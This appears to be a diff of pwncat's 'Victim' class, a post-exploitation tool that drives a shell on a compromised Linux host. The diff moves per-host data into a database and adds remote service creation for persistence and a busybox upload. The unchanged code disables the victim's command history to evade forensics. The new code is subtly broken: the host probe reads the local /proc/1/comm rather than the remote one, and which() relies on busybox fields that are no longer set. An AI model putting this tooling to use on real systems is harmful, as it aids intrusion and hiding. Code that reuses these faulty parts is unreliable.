@@ -6,7 +6,7 @@ import shlex
 import socket
 import sys
 import time
-from typing import Dict, Optional, IO, Any, List, Tuple
+from typing import Dict, Optional, IO, Any, List, Tuple, Iterator
 
 import requests
 from colorama import Fore
@@ -21,8 +21,18 @@ from pwncat.commands import CommandParser
 from pwncat.config import Config, KeyType
 from pwncat.file import RemoteBinaryPipe
 from pwncat.gtfobins import GTFOBins, Capability, Stream
+from pwncat.remote import RemoteService
 from pwncat.tamper import Tamper, TamperManager
 from pwncat.util import State
+
+
+def remove_busybox_tamper():
+    """ This is kind of a hack. We need a global callback which can be pickled
+    to remove the tamper referencing busybox. Placing this in the global context
+    and referencing pwncat.victim vice self allows it to be safely pickled, and
+    used in the current session or a future one. """
+
+    pwncat.victim.remove_busybox()
 
 
 class Victim:
@@ -57,22 +67,24 @@ class Victim:
         setting the local terminal to raw. It also maintains the state to open a
         local terminal if requested and exit raw mode. """
 
+        # Configuration storage for this victim
         self.config = Config(self)
+        # Current user input state
         self._state = State.COMMAND
+        # Saved remote terminal state (for transition to/from raw mode)
         self.saved_term_state = None
-        self.input = b""
-        self.lhost = None
-        self.known_binaries: Dict[str, Optional[str]] = {}
-        self.known_users: Dict[str, Any] = {}
-        self.vars = {"lhost": util.get_ip_addr()}
+        # Prompt and prompt prefix
         self.remote_prefix = "\\[\\033[01;31m\\](remote)\\[\\033[00m\\]"
         self.remote_prompt = (
             "\\[\\033[01;33m\\]\\u@\\h\\[\\033[00m\\]:\\["
             "\\033[01;36m\\]\\w\\[\\033[00m\\]\\$ "
         )
+        # Whether busybox is installed
         self.has_busybox = False
         self.busybox_path: Optional[str] = None
+        # What local binaries this busybox can replace
         self.busybox_provides: List[str] = []
+        # Aliases for equivalent commands
         self.binary_aliases = {
             "python": [
                 "python2",
@@ -85,25 +97,37 @@ class Victim:
             "sh": ["bash", "zsh", "dash"],
             "nc": ["netcat", "ncat"],
         }
+        # GTFObins manager for this host
         self.gtfo: GTFOBins = GTFOBins("data/gtfobins.json", self.which)
-        self.default_privkey = "./data/pwncat"
+        # Whether the user has pressed the defined prefix
         self.has_prefix = False
+        # Parser for local command input
         self.command_parser: CommandParser = CommandParser()
+        # Victim system tamper tracker
         self.tamper: TamperManager = TamperManager()
+        # The client socket
         self.client: Optional[socket.SocketType] = None
-        self.arch: str = "unknown"
+        # The shell we are running under on the remote host
         self.shell: str = "unknown"
+        # A privesc locator/manager
         self.privesc: privesc.Finder = None
+        # Persistence manager
         self.persist: persist.Persistence = persist.Persistence()
+        # Database engine
         self.engine: Engine = None
+        # Database session
         self.session: Session = None
+        # The host object as seen by the database
         self.host: pwncat.db.Host = None
 
     def connect(self, client: socket.SocketType):
 
+        # Create the database engine, and then create the schema
+        # if needed.
         self.engine = create_engine(self.config["db"], echo=False)
         pwncat.db.Base.metadata.create_all(self.engine)
 
+        # Create the session_maker and default session
         if self.session is None:
             self.session_maker = sessionmaker(bind=self.engine)
             self.session = self.session_maker()
@@ -111,7 +135,10 @@ class Victim:
         # Initialize the socket connection
         self.client = client
 
-        # We should always get a response within 3 seconds...
+        # We should always get a response within 1 seconds...
+        # This is changed in some cases by individual functions, but
+        # it will always be returned to one second. This doesn't apply
+        # when in raw mode, since we do asynchronous IO in that case.
         self.client.settimeout(1)
 
         # Attempt to grab the remote hostname and mac address
@@ -144,23 +171,27 @@ class Victim:
             util.warn("no mac address detected; host id only based on hostname!")
 
         # Calculate the remote host's hash entry for lookup/storage in the database
+        # Ideally, this is a hash of the host and mac address. Worst case, it's a hash
+        # of "None", which isn't helpful. A middleground is possibly being able to
+        # get one or the other, which is also helpful and may happen if hostname isn't
+        # available or both ifconfig and "ip" aren't available.
         host_hash = hashlib.md5(hostname + str(mac).encode("utf-8")).hexdigest()
 
         # Lookup the remote host in our database. If it's not there, create an entry
         self.host = self.session.query(pwncat.db.Host).filter_by(hash=host_hash).first()
         if self.host is None:
+            # Create a new host entry
             self.host = pwncat.db.Host(hash=host_hash)
+            # Probe for system information
+            self.probe_host_details()
+            # Add the host to the session
             self.session.add(self.host)
+            # Commit what we know
             self.session.commit()
 
         # We initialize this here, because it needs the database to initialize
         # the history objects
         self.command_parser.setup_prompt()
-
-        # Attempt to identify architecture
-        self.arch = self.run("uname -m").decode("utf-8").strip()
-        if self.arch == "amd64":
-            self.arch = "x86_64"
 
         # Ensure history is disabled
         util.info("disabling remote command history", overlay=True)
@@ -174,25 +205,8 @@ class Victim:
         self.shell = self.which(self.shell.split(" ")[0])
         util.info(f"running in {Fore.BLUE}{self.shell}{Fore.RESET}")
 
-        # Locate interesting binaries
-        # The auto-resolving doesn't work correctly until we have a pty
-        # so, we manually resolve a list of useful binaries prior to spawning
-        # a pty
-        for name in Victim.INTERESTING_BINARIES:
-            util.info(
-                f"resolving remote binary: {Fore.YELLOW}{name}{Fore.RESET}",
-                overlay=True,
-            )
-
-            # Look for the given binary
-            response = self.run(f"which {shlex.quote(name)}").strip()
-            if response == b"":
-                continue
-
-            self.known_binaries[name] = response.decode("utf-8")
-
-        # Now, we can resolve using `which` w/ request=False for the different
-        # methods
+        # At this point, the system is functioning, but we don't have a raw terminal/
+        # pseudoterminal. Here, we attempt a couple methods of gaining a PTY.
         if self.which("python") is not None:
             method_cmd = Victim.OPEN_METHODS["python"].format(
                 self.which("python"), self.shell
@@ -216,8 +230,8 @@ class Victim:
             f"opening pseudoterminal via {Fore.GREEN}{method}{Fore.RESET}", overlay=True
         )
         self.run(method_cmd, wait=False)
-        # client.sendall(method_cmd.encode("utf-8") + b"\n")
 
+        # This stuff won't carry through to the PTY, so we need to reset it again.
         util.info("setting terminal prompt", overlay=True)
         self.run("unset PROMPT_COMMAND")
         self.run(f'export PS1="{self.remote_prefix} {self.remote_prompt}"')
@@ -229,12 +243,15 @@ class Victim:
         # Disable automatic margins, which fuck up the prompt
         self.run("tput rmam")
 
+        # Now that we have a stable connection, we can create our
+        # privesc finder object.
         self.privesc = privesc.Finder()
 
         # Save our terminal state
         self.stty_saved = self.run("stty -g").decode("utf-8").strip()
 
-        # The session is fully setup now
+        # The session is fully setup now. This unlocks other
+        # commands in the command parser, which were blocked before.
         self.command_parser.loaded = True
 
         # Synchronize the terminals
@@ -250,7 +267,7 @@ class Victim:
         makes file upload/download safer, since we have a known good set of 
         commands we can run (rather than relying on GTFObins) """
 
-        if self.has_busybox:
+        if self.host.busybox is not None:
             util.success("busybox is already available!")
             return
 
@@ -263,11 +280,11 @@ class Victim:
             busybox_url = url.rstrip("/") + "/busybox-{arch}"
 
             # Attempt to download the busybox binary
-            r = requests.get(busybox_url.format(arch=self.arch), stream=True)
+            r = requests.get(busybox_url.format(arch=self.host.arch), stream=True)
 
             # No busybox support
             if r.status_code == 404:
-                util.warn(f"no busybox for architecture: {self.arch}")
+                util.warn(f"no busybox for architecture: {self.host.arch}")
                 return
 
             # Grab the original_content length if provided
@@ -291,7 +308,7 @@ class Victim:
 
                 # Run the transfer with a progress bar
                 util.with_progress(
-                    f"uploading busybox for {self.arch}", transfer, length,
+                    f"uploading busybox for {self.host.arch}", transfer, length,
                 )
 
             # Make busybox executable
@@ -303,16 +320,19 @@ class Victim:
                     f"{Fore.RED}installed{Fore.RESET} {Fore.GREEN}busybox{Fore.RESET} "
                     f"to {Fore.CYAN}{busybox_remote_path}{Fore.RESET}"
                 ),
-                self.remove_busybox,
+                remove_busybox_tamper,
             )
 
             util.success(
                 f"uploaded busybox to {Fore.GREEN}{busybox_remote_path}{Fore.RESET}"
             )
 
+            self.host.busybox_uploaded = True
+
         else:
             # Busybox was provided on the system!
             util.success(f"busybox already installed on remote system!")
+            self.host.busybox_uploaded = False
 
         # Check what this busybox provides
         util.progress("enumerating provided applets")
@@ -350,22 +370,83 @@ class Victim:
             provides = new_provides
 
         # Let the class know we now have access to busybox
-        self.busybox_provides = provides
-        self.has_busybox = True
-        self.busybox_path = busybox_remote_path
+        self.host.busybox = busybox_remote_path
+
+        # Replace anything we provide in our binary cache with the busybox version
+        for name in provides:
+            binary = (
+                self.session.query(pwncat.db.Binary)
+                .filter_by(host_id=self.host.id, name=name)
+                .first()
+            )
+            if binary is not None:
+                self.session.delete(binary)
+            binary = pwncat.db.Binary(name=name, path=f"{busybox_remote_path} {name}")
+            self.host.binaries.append(binary)
+
+        self.session.commit()
+
+    def probe_host_details(self):
+        """ Probe the remote host to identify a variety of information. This only
+        happens if we have never connected to this host before. """
+
+        util.progress("identifying init system")
+        with open("/proc/1/comm", "r") as filp:
+            init = filp.read()
+
+        if "systemd" in init:
+            self.host.init = util.Init.SYSTEMD
+        elif "upstart" in init:
+            self.host.init = util.Init.UPSTART
+        elif "sysv" in init:
+            self.host.init = util.Init.SYSV
+
+        util.progress("identifying remote kernel version")
+        try:
+            self.host.kernel = self.env(["uname", "-r"]).strip().decode("utf-8")
+        except FileNotFoundError:
+            self.host.kernel = "unknown"
+
+        util.progress("identifying remote architecture")
+        try:
+            self.host.arch = self.env(["uname", "-m"]).strip().decode("utf-8")
+        except FileNotFoundError:
+            self.host.arch = "unknown"
+
+        util.progress("identifying remote distribution")
+        try:
+            with self.open("/etc/os-release", "r") as filp:
+                for line in filp:
+                    if line.startswith("ID="):
+                        self.host.distro = line.strip().split("=")[1]
+                        break
+                else:
+                    self.host.distro = "unknown"
+        except FileNotFoundError:
+            self.host.distro = "unknown"
 
     def remove_busybox(self):
         """ Remove the busybox installation """
 
-        self.has_busybox = False
-        self.busybox_provides = []
+        for binary in self.host.binaries:
+            if self.host.busybox in binary.path:
+                self.session.delete(binary)
 
-        self.run(f"rm -f {self.busybox_path}")
+        # Did we upload a copy of busybox or was it already installed?
+        if self.host.busybox_uploaded:
+            try:
+                self.env(["rm", "-rf", self.host.busybox])
+            except FileNotFoundError:
+                util.warn(
+                    f"rm not found! {self.host.busybox} not removed from filesystem."
+                )
 
-    def which(self, name: str, request=True, quote=False) -> Optional[str]:
+            self.host.busybox = None
+            self.host.busybox_uploaded = False
+
+    def which(self, name: str, quote=False) -> Optional[str]:
         """ Call which on the remote host and return the path. The results are
         cached to decrease the number of remote calls. """
-        path = None
 
         if self.has_busybox:
             if name in self.busybox_provides:
@@ -374,14 +455,20 @@ class Victim:
                 else:
                     return f"{self.busybox_path} {name}"
 
-        if name in self.known_binaries and self.known_binaries[name] is not None:
-            # Cached value available
-            path = self.known_binaries[name]
-        elif name not in self.known_binaries and request:
-            # It hasn't been looked up before, request it.
-            path = self.run(f"which {shlex.quote(name)}").decode("utf-8").strip()
+        binary = (
+            self.session.query(pwncat.db.Binary)
+            .filter_by(name=name, host_id=self.host.id)
+            .first()
+        )
+        if binary is not None:
+            path = binary.path
+        else:
+            path = self.run(f"which {shlex.quote(name)}").strip().decode("utf-8")
             if path == "" or "which: no" in path:
                 path = None
+            else:
+                binary = pwncat.db.Binary(name=name, path=path)
+                self.host.binaries.append(binary)
 
         if name in self.binary_aliases and path is None:
             # Look for aliases of this command as a last resort
@@ -389,9 +476,6 @@ class Victim:
                 path = self.which(alias, quote=False)
                 if path is not None:
                     break
-
-        # Cache the value
-        self.known_binaries[name] = path
 
         if quote and path is not None:
             path = shlex.quote(path)
@@ -489,6 +573,45 @@ class Victim:
     def restore_local_term(self):
         """ Save the local terminal state """
         util.restore_terminal(self.saved_term_state)
+
+    def env(
+        self,
+        argv: List[str],
+        envp: Dict[str, Any] = None,
+        wait: bool = True,
+        input: bytes = b"",
+        **kwargs,
+    ) -> bytes:
+        """ Run the given command with the given environment variables set.
+        This behaves similar to the `env` command on linux. However, there
+        is not a functionality to clear the environment prior to running
+        at this time.
+        """
+
+        # No environment!
+        if envp is None:
+            envp = {}
+
+        # Resolve the path
+        binary_path = self.which(argv[0])
+        if binary_path is None:
+            raise FileNotFoundError
+
+        # Replace the name with the path
+        argv[0] = binary_path
+
+        # Extend the environment with other keyword arguments
+        envp.update(kwargs)
+
+        # Build the environment statements
+        command = " ".join(
+            [f"{util.quote(key)}={util.quote(value)}" for key, value in envp.items()]
+        )
+        # Join in the command string
+        command = f"{command} " + util.join(argv)
+
+        # Run the command
+        return self.run(command, wait=wait, input=input)
 
     def run(self, cmd, wait: bool = True, input: bytes = b"") -> bytes:
         """ Run a command in the context of the remote host and return the
@@ -631,16 +754,6 @@ class Victim:
 
         return pipe
 
-    def do_test(self, argv):
-
-        util.info("Attempting to stream data to a remote file...")
-        with self.open("/tmp/stream_test", "w") as filp:
-            filp.write("It fucking worked!")
-
-        util.info("Attempting to stream the data back...")
-        with self.open("/tmp/stream_test", "r") as filp:
-            print(filp.read())
-
     def get_file_size(self, path: str):
         """ Get the size of a remote file """
 
@@ -714,6 +827,10 @@ class Victim:
                 access |= util.Access.DIRECTORY
             elif b"file" in result:
                 access |= util.Access.REGULAR
+            if b"parent_dir" in result:
+                access |= util.Access.PARENT_EXIST
+            if b"parent_write" in result:
+                access |= util.Access.PARENT_WRITE
 
         return access
 
@@ -781,31 +898,16 @@ class Victim:
         method = None
         stream = Stream.ANY
 
-        test = self.which("test")
-        if test is None:
-            test = self.which("[")
-
-        # Try to save ourselves...
-        if test is not None:
-            result = self.run(
-                f"{test} -e {shlex.quote(path)} && echo exists;"
-                f"{test} -d {shlex.quote(path)} && echo directory;"
-                f"{test} -w {shlex.quote(path)} && echo writable"
-            )
-            if b"directory" in result:
-                raise IsADirectoryError(f"Is a directory: '{path}'")
-            if b"exists" in result and not b"writable" in result:
+        access = self.access(path)
+        if util.Access.DIRECTORY in access:
+            raise IsADirectoryError(f"Is a directory: '{path}'")
+        if util.Access.EXISTS in access and not util.Access.WRITE in access:
+            raise PermissionError(f"Permission denied: '{path}'")
+        if util.Access.EXISTS not in access:
+            if util.Access.PARENT_EXIST not in access:
+                raise FileNotFoundError(f"No such file or directory: '{path}' {access}")
+            if util.Access.PARENT_WRITE not in access:
                 raise PermissionError(f"Permission denied: '{path}'")
-            if b"exists" not in result:
-                parent = os.path.dirname(path)
-                result = self.run(
-                    f"{test} -d {shlex.quote(parent)} && echo exists;"
-                    f"{test} -w {shlex.quote(parent)} && echo writable"
-                )
-                if b"exists" not in result:
-                    raise FileNotFoundError(f"No such file or directory: '{path}'")
-                if b"writable" not in result:
-                    raise PermissionError(f"Permission denied: '{path}'")
 
         # If we want binary transfer, we can't use Stream.PRINT
         if "b" in mode:
@@ -881,6 +983,47 @@ class Victim:
             path = self.run(mktemp).strip().decode("utf-8")
 
         return self.open(path, mode, length=length)
+
+    @property
+    def services(self) -> Iterator[RemoteService]:
+        """ Retrieve a list of installed services and their state """
+
+        # Ensure we know how to handle this init system
+        if self.host.init not in pwncat.remote.service_map:
+            return
+
+        # Yield the services which are enumerated from this specific init system
+        yield from pwncat.remote.service_map[self.host.init].enumerate()
+
+    def find_service(self, name: str, user: bool = False):
+        """ Lookup a service by name """
+
+        # Ensure we know how to handle this init system
+        if self.host.init not in pwncat.remote.service_map:
+            raise ValueError("unknown service manager")
+
+        # Pass the request to the init-specific system
+        return pwncat.remote.service_map[self.host.init].find(name, user)
+
+    def create_service(
+        self,
+        name: str,
+        description: str,
+        target: str,
+        runas: str,
+        enable: bool,
+        user: bool = False,
+    ) -> RemoteService:
+        """ Create a service on the remote host """
+
+        # Ensure we know how to handle this init system
+        if self.host.init not in pwncat.remote.service_map:
+            raise ValueError("unknown service manager")
+
+        # Pass the request to the init-specific system
+        return pwncat.remote.service_map[self.host.init].create(
+            name, description, target, runas, enable, user
+        )
 
     def raw(self, echo: bool = False):
         self.stty_saved = self.run("stty -g").decode("utf-8").strip()
@@ -1026,7 +1169,7 @@ class Victim:
                 line = line.strip().split(":")
                 user = (
                     self.session.query(pwncat.db.User)
-                    .filter_by(host_id=self.host.id, id=int(line[2]))
+                    .filter_by(host_id=self.host.id, id=int(line[2]), name=line[0])
                     .first()
                 )
                 if user is None:
